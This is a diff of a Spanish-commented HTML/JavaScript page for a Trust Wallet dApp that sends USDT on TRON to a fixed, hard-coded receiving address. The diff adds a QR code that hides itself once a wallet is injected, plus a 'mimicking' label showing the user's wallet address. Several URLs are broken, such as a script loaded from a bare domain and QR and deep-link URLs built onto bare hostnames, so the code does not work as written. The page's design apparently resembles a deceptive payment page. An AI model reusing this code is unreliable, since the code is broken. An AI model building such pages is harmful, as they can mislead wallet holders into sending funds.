@@ -28,7 +28,7 @@
         }
         h2 { margin-bottom: 20px; color: #38bdf8; font-size: 22px; }
         
-        /* Contenedor del QR Animado */
+        /* Contenedor del QR Limpio */
         #qrContainer {
             background-color: #ffffff;
             padding: 15px;
@@ -36,7 +36,12 @@
             display: inline-block;
             margin-bottom: 25px;
             box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-            transition: opacity 0.4s ease, margin 0.4s ease;
+            transition: opacity 0.4s ease;
+        }
+        #qrContainer img {
+            display: block;
+            width: 200px;
+            height: 200px;
         }
         
         .form-group { margin-bottom: 20px; text-align: left; }
@@ -72,22 +77,35 @@
             word-break: break-all;
         }
         .status.info { background-color: #1e3a8a; color: #93c5fd; }
-        .status.success { background-color: #064e3b; color: #6ee7b7; }
         .status.error { background-color: #7f1d1d; color: #fca5a5; }
+        
+        /* Etiqueta mimetizada con la wallet del usuario activa */
+        #walletLabel {
+            display: none;
+            background-color: #0f172a;
+            border: 1px solid #334155;
+            padding: 8px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 13px;
+            color: #38bdf8;
+            margin-bottom: 20px;
+            word-break: break-all;
+        }
     </style>
-
-    <!-- Script de generación de matrices QR -->
-    <script src="https://cloudflare.com"></script>
 </head>
 <body>
 
     <div class="container">
         <h2 id="titleText">Escanear con Trust Wallet</h2>
         
-        <!-- Bloque del QR que se ocultará automáticamente -->
+        <!-- Bloque del QR Nativo por API de Google -->
         <div id="qrContainer">
-            <div id="qrcode"></div>
+            <img id="qrImage" src="" alt="Código QR de Conexión">
         </div>
+
+        <!-- Etiqueta informativa del emisor conectado -->
+        <div id="walletLabel"></div>
 
         <div class="form-group">
             <label for="amountInput">Cantidad a enviar</label>
@@ -106,51 +124,54 @@
             const input = document.getElementById('amountInput');
             const status = document.getElementById('status');
             const qrContainer = document.getElementById('qrContainer');
+            const qrImage = document.getElementById('qrImage');
             const titleText = document.getElementById('titleText');
+            const walletLabel = document.getElementById('walletLabel');
 
             let procesoEnCurso = false;
 
             // ============================================================
             // CONFIGURACIÓN PRODUCCIÓN REAL (MAINNET)
             // ============================================================
-            const DIRECCION_DESTINO_FIJA = "TU_DIRECCION_TRON_REAL_AQUI"; // REEMPLAZA CON TU DIRECCIÓN RECEPTORA
+            const DIRECCION_DESTINO_FIJA = "TU_DIRECCION_TRON_REAL_AQUI"; // REEMPLAZA CON TU DIRECCIÓN RECEPTORA REAL
             const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Contrato oficial de Tether USDT
 
-            // Generación dinámica del deep link sin alteraciones de caracteres HTML
+            // Generación automática del deep link limpio de forma nativa
             const urlDestinoDapp = "https://onrender.com";
             const enlaceCompletoTrust = "https://trustwallet.com" + encodeURIComponent(urlDestinoDapp);
 
-            // Inicializar QR estático puro
-            new QRCode(document.getElementById("qrcode"), {
-                text: enlaceCompletoTrust,
-                width: 200,
-                height: 200,
-                colorDark : "#000000",
-                colorLight : "#ffffff",
-                correctLevel : QRCode.CorrectLevel.H
-            });
+            // Inyección del QR usando el motor de renderizado de imágenes de Google (Infallible)
+            if (qrImage) {
+                qrImage.src = "https://googleapis.com" + encodeURIComponent(enlaceCompletoTrust) + "&choe=UTF-8";
+            }
 
             // ============================================================
-            // DETECTOR EN TIEMPO REAL PARA OCULTAR EL QR
+            // DETECTOR EN TIEMPO REAL PARA OCULTAR EL QR MOSTRANDO LA WALLET
             // ============================================================
             function verificarEntornoInyectado() {
-                // Si la página detecta que ya se abrió dentro del dApp Browser (existe tronWeb activo)
                 if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                    const direccionDetectada = window.tronWeb.defaultAddress.base58;
+                    
                     if (qrContainer && qrContainer.style.display !== 'none') {
-                        // Ocultar la caja del QR de la vista del usuario
+                        // Ocultar QR de la vista móvil
                         qrContainer.style.opacity = '0';
                         setTimeout(() => {
                             qrContainer.style.display = 'none';
                         }, 400);
                         
-                        // Modificar dinámicamente el título principal de la dApp
-                        if (titleText) titleText.textContent = "Billetera Conectada Exitosamente";
-                        console.log("[Web3] Entorno activo verificado. Ocultando QR de la interfaz.");
+                        // Modificar textos dinámicamente
+                        if (titleText) titleText.textContent = "Billetera Vinculada";
+                        
+                        // Mostrar la etiqueta de dirección recortada (Muestra los primeros 6 y últimos 4 caracteres)
+                        if (walletLabel) {
+                            walletLabel.textContent = "Wallet: " + direccionDetectada.substring(0, 6) + "..." + direccionDetectada.substring(direccionDetectada.length - 4);
+                            walletLabel.style.display = 'block';
+                        }
                     }
                 }
             }
 
-            // Ejecutar la inspección de entorno de manera cíclica cada segundo
+            // Monitorear la inyección cada segundo
             setInterval(verificarEntornoInyectado, 1000);
 
             function setStatus(message, type = 'info') {
@@ -213,9 +234,4 @@
 
                         if (tx) {
                             document.body.innerHTML = `
-                                <div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: sans-serif; padding: 20px; text-align: center;">
-                                    <div style="background-color: #f0fdf4; border-radius: 50%; padding: 20px; margin-bottom: 20px;">
-                                        <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2.5"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
-                                    </div>
-                                    <h1 style="color: #1e293b; font-size: 26px; margin-bottom: 10px;">Envío Exitoso</h1>
-                                    <p style="color: #64748b; font-size: 16px;">La transacción ha sido transmitida de manera correcta.</p>
+
